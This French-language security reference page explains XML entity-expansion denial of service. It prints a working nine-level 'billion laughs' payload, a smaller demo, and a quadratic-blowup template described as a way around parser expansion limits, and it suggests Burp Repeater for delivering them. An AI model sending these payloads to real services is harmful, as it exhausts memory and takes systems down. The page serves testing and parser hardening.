---
title: "Déni de service par expansion d'entités XML (XML bomb)"
description: "Des entités internes imbriquées s'expansent de façon exponentielle, transformant quelques kilo-octets de XML en giga-octets en mémoire et épuisant le parseur."
keywords:
  - XML bomb
  - billion laughs
  - expansion d'entités
  - quadratic blowup
  - déni de service
---

# XML bomb

Une XML bomb ne requiert aucune ressource externe ni réseau. Elle abuse de l'expansion d'entités générales **internes** : une entité peut en référencer d'autres, et un parseur qui les expanse de façon anticipée construira en mémoire la chaîne entièrement résolue. En imbriquant les références de sorte que chaque couche multiplie celle du dessous, un document minuscule force le parseur à allouer une sortie énorme, épuisant la mémoire ou le CPU et mettant le service à terre.

## Billion laughs

La forme canonique chaîne les entités, chacune définie comme dix copies de la précédente (ce payload définit neuf niveaux) :

```xml
<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
  <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
  <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
  <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
  <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
  <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<lolz>&lol9;</lolz>
```

Chaque niveau multiplie par dix, donc avec neuf niveaux `&lol9;` s'expanse en 10^8 copies de la chaîne de trois octets `lol`, soit environ 300 méga-octets, à partir d'un document inférieur à un kilo-octet (l'ajout d'un dixième niveau atteint les 10^9 / ~3 Go qui donnent à l'attaque son nom de « billion laughs »). La référence est `&lol9;` placée une seule fois dans le corps. L'expansion est exponentielle en fonction du nombre de niveaux déclarés, donc l'ajout d'entités fait croître le payload de façon géométrique tandis que le fichier source change à peine de taille.

La même structure avec moins de niveaux illustre encore le mécanisme tout en restant facile à appréhender :

```xml
<!DOCTYPE lolz [
  <!ENTITY a "aaaaaaaaaa">
  <!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;">
  <!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;">
  <!ENTITY d "&c;&c;&c;&c;&c;&c;&c;&c;&c;&c;">
]>
<lolz>&d;</lolz>
```

## Quadratic blowup

De nombreux parseurs plafonnent désormais le nombre d'expansions d'entités ou la taille totale expansée, ce qui déjoue la forme exponentielle profondément imbriquée. La variante **quadratic blowup** contourne ces plafonds en utilisant une unique grande entité référencée de nombreuses fois, de sorte que le nombre d'expansions reste modeste tandis que la taille de sortie explose quand même.

```xml
<?xml version="1.0"?>
<!DOCTYPE bomb [
  <!ENTITY a "aaaaaaaaaa...aaaa">
]>
<bomb>&a;&a;&a;&a;&a; ...tens of thousands of references... &a;</bomb>
```

Définissez une entité contenant un grand bloc (par exemple 50 000 caractères), puis référencez-la des dizaines de milliers de fois dans le corps. Si l'entité fait *n* octets et est référencée *n* fois, le parseur matérialise *n* au carré octets, donc quelques centaines de kilo-octets de source deviennent des giga-octets de texte résolu. Comme il n'y a qu'un seul niveau d'indirection, les limites de profondeur par entité ne se déclenchent pas, et le nombre de références reste sous les compteurs d'expansion naïfs tandis que la mémoire et le CPU grimpent quand même jusqu'à l'épuisement.

Des variantes à entités paramètres des deux formes existent pour les contextes de traitement de DTD, et la même multiplication s'applique lorsque la valeur expansée est copiée dans une entité paramètre au lieu du corps du document.

## Outils

- **Burp Repeater** : livraison de payloads à entités imbriquées et mesure de l'impact sur le parseur.
- Tests manuels avec des documents billion-laughs et quadratic-blowup confectionnés.

## Références

- [OWASP: XML External Entity (XXE) Processing](https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing)
- [PayloadsAllTheThings: XXE Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection)
